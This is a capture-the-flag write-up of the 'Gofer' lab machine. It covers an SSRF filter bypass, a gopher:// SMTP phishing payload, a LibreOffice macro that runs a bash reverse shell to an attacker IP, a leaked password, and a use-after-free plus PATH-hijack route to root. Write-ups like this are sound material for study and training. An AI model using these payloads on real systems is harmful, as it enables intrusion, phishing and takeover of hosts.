# Gofer

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.53.84
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-30 20:51 +08
Nmap scan report for 10.129.53.84
Host is up (0.17s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT    STATE    SERVICE
22/tcp  open     ssh
25/tcp  filtered smtp
80/tcp  open     http
139/tcp open     netbios-ssn
445/tcp open     microsoft-ds
```

Did a detailed scan as well:

```
$ nmap -p 80,139,445 -sC -sV --min-rate 3000 10.129.53.84             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-30 20:52 +08
Nmap scan report for 10.129.53.84
Host is up (0.17s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to http://gofer.htb/
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: Host: gofer.htb
```

We can add this domain to our `/etc/hosts` file.&#x20;

### Web Enumeration --> LFI

Port 80 hosted a typical corporate site:

<figure><img src="../../.gitbook/assets/image (4122).png" alt=""><figcaption></figcaption></figure>

Within the site, there wasn't much apart from a few names like Jocelyn Hudson and stuff.

<figure><img src="../../.gitbook/assets/image (4123).png" alt=""><figcaption></figcaption></figure>

`gobuster` scans reveal nothing much, but a `wfuzz` scan shows one subdomain has been returned.&#x20;

```
$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 400,301 -H 'Host:FUZZ.gofer.htb' http://gofer.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://gofer.htb/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000001171:   401        14 L     54 W       462 Ch      "proxy"
```

Visiting this subdomain requires credentials:

<figure><img src="../../.gitbook/assets/image (4124).png" alt=""><figcaption></figcaption></figure>

Weak credentials don't work at all. I tested a few common directories with different requests, and found that `index.php` accepted POST requests without credentials:

```
$ curl -X POST http://proxy.gofer.htb/index.php
<!-- Welcome to Gofer proxy -->
<html><body>Missing URL parameter !</body></html>
```

Testing it a bit more reveals where the URL parameter can be specified:

```
$ curl -X POST -d 'URL=http://10.10.14.42' http://proxy.gofer.htb/index.php
<!-- Welcome to Gofer proxy -->
<html><body>Missing URL parameter !</body></html>
$ curl -X POST http://proxy.gofer.htb/index.php?url=http://10.10.14.42
<!-- Welcome to Gofer proxy -->
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href=".android/">.android/</a></li>
<li><a href=".ansible/">.ansible/</a></li>
<TRUNCATED>
```

So we have SSRF on this machine with this `url` parameter. I attempted some LFI using the `file://` protocol, but there's a WAF in the way:

```
$ curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd
<!-- Welcome to Gofer proxy -->
<html><body>Blacklisted keyword: file:// !</body></html>
```

A bit more testing by removing `/` characters eventually works! This tells me that the WAF is rather weak.&#x20;

<figure><img src="../../.gitbook/assets/image (4125).png" alt=""><figcaption></figcaption></figure>

### SMB --> Phishing Download

Port 445 is open on this Linux host, and it shows us one share.&#x20;

```
$ smbmap -H 10.129.53.84                       
[+] IP: 10.129.53.84:445        Name: 10.129.53.84                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        shares                                                  READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.13.13-Debian)
```

We can access this share via `smbclient`.

```
$ smbclient //gofer.htb/shares                 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Oct 29 03:32:08 2022
  ..                                  D        0  Fri Apr 28 19:59:34 2023
  .backup                            DH        0  Thu Apr 27 20:49:32 2023

                5061888 blocks of size 1024. 2107860 blocks available
smb: \> cd .backup
ls
smb: \.backup\> ls
  .                                   D        0  Thu Apr 27 20:49:32 2023
  ..                                  D        0  Sat Oct 29 03:32:08 2022
  mail                                N     1101  Thu Apr 27 20:49:32 2023

                5061888 blocks of size 1024. 2107664 blocks available
smb: \.backup\> get mail
getting file \.backup\mail of size 1101 as mail (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
```

There was one file present, and when read it points us towards using phishing as the initial access.

{% code overflow="wrap" %}
```
$ cat mail               
From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
Return-Path: <jdavis@gofer.htb>
X-Original-To: tbuckley@gofer.htb
Delivered-To: tbuckley@gofer.htb
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: <20221028192857.C8F7461827@gofer.htb>
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
```
{% endcode %}

We need to use an `.odt` format to exploit this, and it appears that this is from the user Jeff Davis from the company site (with a username of `jdavis`, so we know the username naming convention).&#x20;

Since we have some kind of SSRF on the `proxy` service, we might be able to force a user to download and execute a malicious `.odt` file via macros to get the first shell. However, we first need to find out how to send an email through the `proxy` to the user since SMTP is not publicly facing.&#x20;

Based on the box name alone, I sort of figured out that we need to use the `gopher://` protocol, which is used to send files to other users.&#x20;

{% embed url="https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2" %}

This repository can generate the payloads required:

{% embed url="https://github.com/tarunkant/Gopherus" %}

{% code overflow="wrap" %}
```
$ python2 gopherus.py --exploit smtp

                                                                                             
  ________              .__                                                                  
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                   
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                   
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                    
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                   
        \/       |__|        \/     \/                 \/                                    
                                                                                             
                author: $_SpyD3r_$                                                           
                                                                                             

Give Details to send mail: 

Mail from :  iamanidiot@gofer.htb
Mail To :  jhudson@gofer.htb
Subject :  hello testing
Message :  http://10.10.14.42/bad.odt

Your gopher link is ready to send Mail:                                                      
                                                                                             
gopher://127.0.0.1:25/_MAIL%20FROM:iamanidiot%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:iamanidiot%40gofer.htb%0ASubject:hello%20testing%0AMessage:http://10.10.14.42/bad.odt%0A.

-----------Made-by-SpyD3r-----------
```
{% endcode %}

This payload almost works, except for the fact that the IP address is flagged:

{% code overflow="wrap" %}
```
$ curl -X 'POST' 'http://proxy.gofer.htb/index.php?url=gopher://127.0.0.1:25/_MAIL%20FROM:iamanidiot%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:iamanidiot%40gofer.htb%0ASubject:hello%20testing%0AMessage:http://10.10.14.42/bad.odt%0A'
<!-- Welcome to Gofer proxy -->
<html><body>Blacklisted keyword: /127 !</body></html>
```
{% endcode %}

We can specify the IP address in decimal mode in order to bypass this.&#x20;

{% code overflow="wrap" %}
```
$ curl -X 'POST' 'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_MAIL%20FROM:iamanidiot%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:iamanidiot%40gofer.htb%0ASubject:hello%20testing%0AMessage:http://10.10.14.42/bad.odt%0A'
<!-- Welcome to Gofer proxy -->
```
{% endcode %}

However, even after bypassing the WAF, it doesn't work and I get no hits on my HTTP server. I URL decoded it and found that there was some syntax errors with the commands send to SMTP and also some control character errors, since we needed to send `\r\n` to register as an 'Enter' key.&#x20;

```
http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_MAIL FROM:iamanidiot@gofer.htb
RCPT To:jhudson@gofer.htb
DATA
From:iamanidiot@gofer.htb
Subject:hello testing
Message:http://10.10.14.42/bad.odt
```

I edited the payload a bit and URL encoded it to send the&#x20;

{% code overflow="wrap" %}
```
gopher://2130706433:25/xHELO \r\n
MAIL FROM:<iamanidiot@gofer.htb> \r\n
RCPT TO:<jhudson@gofer.htb> \r\n
DATA \r\n
From: <iamanidiot@gofer.htb> \r\n
To: <jhudson@gofer.htb> \r\n

Subject: gg \r\n
\r\n

<a href='http://10.10.14.42/test.odt>hello</a> \r\n
\r\n
\r\n



. \r\n
QUIT \r\n
```
{% endcode %}

Here's the final payload that I used:

{% code overflow="wrap" %}
```
gopher://2130706433:25/xHELO%250d%250aMAIL%20FROM%3A%3Ciamanidiot@gofer.htb%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%3Ciamanidiot@gofer.htb%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250a%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250a<a+href%3d'http%3a//10.10.14.42/date.odt>hello</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
```
{% endcode %}

Since there were some quotes I was lazy to deal with, I sent it in Burp and got a reponse saying it worked:

<figure><img src="../../.gitbook/assets/image (4126).png" alt=""><figcaption></figcaption></figure>

We would also get hits on our HTTP server.&#x20;

### Document Creation --> RCE

I followed this to create my own malicious `.odt` file:

{% embed url="https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html" %}

Here's the macro I used:

```visual-basic
Sub Main
	Shell("bash -c 'bash -i >& /dev/tcp/10.10.14.42/4444 0>&1'")
End Sub
```

We can then assign this to the Open Document event:

<figure><img src="../../.gitbook/assets/image (4127).png" alt=""><figcaption></figcaption></figure>

Then we can host this file on a HTTP server and send our Gopher payload. This would give us a reverse shell as the user!

> This image became corrupted when uploading...oops.

## Privilege Escalation

### Tbuckley Creds

I ran `pspy64` and found some user credentials:

```
2023/07/30 15:11:01 CMD: UID=0    PID=28266  | /usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:ooP4dietie3o_hquaeti
```

We can then `su` to `tbuckley`, who is part of the `dev` group:

<figure><img src="../../.gitbook/assets/image (4130).png" alt=""><figcaption></figcaption></figure>

### Notes SUID --> Reverse Engineering

I ran a `linpeas.sh` it picked up on this weird SUID binary:

```
-rwsr-s--- 1 root dev         17K Apr 28 16:06 /usr/local/bin/notes

jhudson@gofer:~$ file /usr/local/bin/notes
/usr/local/bin/notes: setuid, setgid regular file, no read permission
```

When we run this thing, it appears that we can do quite a few things:

```
tbuckley@gofer:/home/jhudson$ /usr/local/bin/notes
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================
```

I transferred the binary back to my machine via `base64` and used `ghidra` to analyse it. Within it, I found some interesting parts. Option 1 is the user creation part:

<figure><img src="../../.gitbook/assets/image (4131).png" alt=""><figcaption></figcaption></figure>

* It allocates 40 bytes for the username in the Heap via `malloc(0x28)`, and afterwards checks whether the `malloc` worked.
* There seems to be 2 parts for this memory, of which it uses the first 24 (0x18) bytes for the `username` since the username part is set to the first block of memory.&#x20;
* The next 16 bytes appears to be something else. `_Var1` is the UID of the current user, and if we are `root`, it sets the 25th to 29th byte to `0x6e696d6461`. If we are not an admin, it just sets the next part to `0x72657375`.&#x20;
* When decoded, the non-root user is called `user` and the `root` user is assigned as `admin`:

```
$ echo 0x72657375 | xxd -p -r 
resu
$ echo 0x6e696d6461 | xxd -r -p
nimda
```

* So basically, the first 24 bytes is the username, and the next 16 bytes is the privilege level of the user, which is set to `user` by default.&#x20;

Option 3 is the delete user option, and it is vulnerable due to dangling pointers:

<figure><img src="../../.gitbook/assets/image (4132).png" alt=""><figcaption></figcaption></figure>

* This is a classic case of a Use After Free vulnerability. The `local_10` variable is `free` here, but the pointer still remains and is not set to NULL.
* This indicates that the pointer is a 'dangling', meaning that any future accesses to it will still point to the allocated memory even if it does not belong to us.
* The bytes of memory for a previous user creation remains.

Option 4 is the write note option, which allows us to overwrite the memory due to the dangling pointer:

<figure><img src="../../.gitbook/assets/image (4133).png" alt=""><figcaption></figcaption></figure>

* One thing to note about `malloc` is that dangling pointers are 'used again', meaning we can reaccess the memory allocated from the user creation.

{% embed url="https://stackoverflow.com/questions/66866307/dangling-pointers-in-c" %}

Option 8 is the main vulnerability:

<figure><img src="../../.gitbook/assets/image (4134).png" alt=""><figcaption></figcaption></figure>

This part of the code checks whether the role of the user has been set to `admin`, and then grants us access to the `tar` command, which does not have its full PATH specified and is thus vulnerable to PATH Hijacking.

To exploit this, we need to:

* Create a user --> Creates the allocated block of 40 bytes.
* Delete the user --> Creates a dangling pointer to our first user created.&#x20;
* Write a note --> Using the notes function, we can write 24 characters for the username, and the have `admin` after the 24th byte to escalate privileges, which looks something like this: `111111111111111111111111admin`.&#x20;
* Use option 8 to execute our malicious `tar` binary.

### Exploit --> Root

First, let's create our `tar` binary:

```bash
cd
echo '#!/bin/bash' > tar
echo 'chmod u+s /bin/bash' >> tar
chmod 777 tar
export PATH=~:$PATH
```

Then,  follow the exploit path I laid above.

```
tbuckley@gofer:~$ /usr/local/bin/notes 
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 1

Choose an username: test

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 3

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 4

Write your note:
111111111111111111111111admin
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 8

Access granted!
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 9
```

Then, we can easily escalate privileges:

<figure><img src="../../.gitbook/assets/image (4135).png" alt=""><figcaption></figcaption></figure>

Rooted!
